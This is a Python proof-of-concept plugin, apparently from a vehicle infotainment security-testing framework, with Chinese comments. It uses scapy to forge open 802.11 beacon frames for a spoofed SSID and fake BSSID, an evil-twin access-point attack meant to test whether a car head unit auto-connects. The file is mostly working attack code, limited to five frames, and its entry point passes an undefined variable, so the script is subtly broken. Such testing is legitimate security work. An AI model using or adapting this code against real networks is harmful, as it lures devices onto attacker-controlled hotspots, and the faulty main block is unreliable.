"""
PoC Name: WiFi Evil Twin AP
CVE: N/A
Component: Wireless Stack
Category: Wireless
Severity: High
CVSS: 7.0
Description: 创建同名伪造AP测试自动连接行为
Prerequisites: 支持Monitor模式的无线网卡 (如 wlan0mon)，并已安装 scapy。
Usage: python3 32_WiFi_Evil_Twin.py <interface>
"""
import sys
import time
from iv_plugin_base import IVIVulnerabilityPlugin

class EvilTwinPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        try:
            import scapy.all as scapy
        except ImportError:
            self.logger.error("未安装scapy工具。请执行: pip install scapy")
            return False
            
        self.interface = self.params.get("interface", "")
        if not self.interface:
            self.logger.error("未指定无线网卡接口 (如 wlan0mon)。")
            return False
        return True

    def exploit(self):
        self.logger.info(f"准备部署 Evil Twin AP (Beacon Flood)，使用网卡: {self.interface}")
        try:
            from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
            
            ssid = self.params.get("ssid", "Vehicle_Free_WiFi")
            bssid = "00:11:22:33:44:55"
            
            self.logger.info(f"伪造 SSID: {ssid}")
            self.logger.info(f"伪造 BSSID: {bssid}")

            # 构造 802.11 Beacon 帧 (未加密网络)
            dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
            beacon = Dot11Beacon(cap="ESS")
            essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            frame = RadioTap()/dot11/beacon/essid
            
            self.logger.info("开始发送伪造热点信标 (安全验证模式，仅发 5 帧)...")
            try:
                sendp(frame, iface=self.interface, inter=0.1, count=5, verbose=False)
                self.logger.info("伪造热点信标发送完毕。")
            except OSError as e:
                self.logger.error(f"设备发送失败，请检查网卡是否支持 Monitor 模式: {str(e)}")
                return {
                    "status": "error",
                    "details": str(e)
                }
                
            self.logger.warning("[!] 请检查目标车机是否自动连接到了未加密的同名热点。")
            
            return {
                "status": "success",
                "vulnerable": True,
                "details": f"Successfully broadcasted Beacon frames for '{ssid}'."
            }

        except Exception as e:
            self.logger.error(f"Execution Error: {str(e)}")
            return {
                "status": "error",
                "details": str(e)
            }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 32_WiFi_Evil_Twin.py <interface>")
        sys.exit(1)
    plugin = EvilTwinPlugin({"interface": iface})
    plugin.run_verify()
